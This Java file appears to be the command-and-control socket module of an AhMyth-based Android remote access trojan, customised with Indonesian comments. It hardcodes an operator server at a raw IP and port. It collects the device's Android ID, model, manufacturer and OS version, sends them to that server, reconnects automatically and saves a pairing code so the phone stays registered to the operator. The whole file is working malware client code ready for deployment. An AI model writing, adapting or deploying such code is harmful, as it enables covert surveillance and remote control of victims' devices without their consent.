package ahmyth.mine.king.ahmyth;

import android.os.Build;
import android.provider.Settings;
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static final String TAG = "IOSocket";
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;

    // ===============================================
    // IP SERVER VPS ANDA
    // ===============================================
    private static final String SERVER_URL = "http://41.216.190.191:42474";

    private static final String PREFS_NAME = "AnratPrefs";
    private static final String KEY_PAIRING_CODE = "pairing_code";
    private static final String KEY_IS_PAIRED = "is_paired";

    private IOSocket() {
        // Constructor kosong
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    /**
     * Inisialisasi socket TANPA pairing code dulu
     * Koneksi dulu, baru kirim pairing code
     */
    public void initSocket(Context context) {
        try {
            String deviceID = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );

            Log.d(TAG, "Initializing socket...");
            Log.d(TAG, "Server URL: " + SERVER_URL);
            Log.d(TAG, "Device ID: " + deviceID);

            // Konfigurasi socket
            IO.Options opts = new IO.Options();
            opts.timeout = 10000;
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 60000;
            opts.forceNew = true;

            // URL dengan device info TANPA pairing code
            String fullUrl = SERVER_URL +
                    "?model=" + android.net.Uri.encode(Build.MODEL) +
                    "&manf=" + android.net.Uri.encode(Build.MANUFACTURER) +
                    "&release=" + android.net.Uri.encode(Build.VERSION.RELEASE) +
                    "&id=" + deviceID;

            Log.d(TAG, "Connecting to: " + fullUrl);

            ioSocket = IO.socket(fullUrl, opts);

            // Setup listeners
            setupConnectionListeners(context);

            Log.d(TAG, "Socket initialized successfully");

        } catch (URISyntaxException e) {
            Log.e(TAG, "URI Syntax Error: " + e.getMessage());
            e.printStackTrace();
        } catch (Exception e) {
            Log.e(TAG, "Error initializing socket: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * Setup connection listeners
     */
    private void setupConnectionListeners(final Context context) {
        if (ioSocket == null) {
            Log.e(TAG, "Socket is null, cannot setup listeners");
            return;
        }

        ioSocket.on(Socket.EVENT_CONNECT, new io.socket.emitter.Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.d(TAG, "✅ Connected to server!");

                // Jika sudah paired sebelumnya, kirim pairing code otomatis
                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String savedCode = prefs.getString(KEY_PAIRING_CODE, null);

                if (savedCode != null) {
                    Log.d(TAG, "Found saved pairing code, sending...");
                    sendPairingCode(savedCode);
                } else {
                    Log.d(TAG, "No saved pairing code found");
                }
            }
        });

        ioSocket.on(Socket.EVENT_CONNECT_ERROR, new io.socket.emitter.Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.e(TAG, "❌ Connection error: " + (args.length > 0 ? args[0] : "unknown"));
            }
        });

        ioSocket.on(Socket.EVENT_DISCONNECT, new io.socket.emitter.Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.w(TAG, "⚠️ Disconnected from server");
            }
        });

        ioSocket.on(Socket.EVENT_RECONNECT, new io.socket.emitter.Emitter.Listener() {
            @Override
            public void call(Object... args) {
                Log.d(TAG, "🔄 Reconnected to server");
            }
        });
    }

    /**
     * Kirim pairing code setelah terkoneksi
     */
    public void sendPairingCode(String pairingCode) {
        try {
            if (ioSocket == null) {
                Log.e(TAG, "Socket is null!");
                return;
            }

            if (!ioSocket.connected()) {
                Log.e(TAG, "Socket not connected!");
                return;
            }

            org.json.JSONObject pairData = new org.json.JSONObject();
            pairData.put("pairing_code", pairingCode);

            Log.d(TAG, "Sending pairing code: " + pairingCode);
            ioSocket.emit("pair_device", pairData);

        } catch (Exception e) {
            Log.e(TAG, "Error sending pairing code: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * Simpan pairing code setelah berhasil
     */
    public void savePairingCode(Context context, String pairingCode) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit()
                .putString(KEY_PAIRING_CODE, pairingCode)
                .putBoolean(KEY_IS_PAIRED, true)
                .apply();
        Log.d(TAG, "Pairing code saved");
    }

    /**
     * Cek apakah sudah paired
     */
    public boolean isPaired(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getBoolean(KEY_IS_PAIRED, false);
    }

    /**
     * Dapatkan pairing code tersimpan
     */
    public String getSavedPairingCode(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getString(KEY_PAIRING_CODE, null);
    }

    /**
     * Clear pairing data (untuk unpair)
     */
    public void clearPairing(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().clear().apply();

        if (ioSocket != null) {
            ioSocket.disconnect();
            ioSocket = null;
        }
        Log.d(TAG, "Pairing cleared");
    }

    /**
     * Connect socket
     */
    public void connect() {
        if (ioSocket != null && !ioSocket.connected()) {
            Log.d(TAG, "Connecting socket...");
            ioSocket.connect();
        }
    }

    /**
     * Disconnect socket
     */
    public void disconnect() {
        if (ioSocket != null && ioSocket.connected()) {
            Log.d(TAG, "Disconnecting socket...");
            ioSocket.disconnect();
        }
    }

    public Socket getIoSocket() {
        return ioSocket;
    }

    public boolean isConnected() {
        return ioSocket != null && ioSocket.connected();
    }
}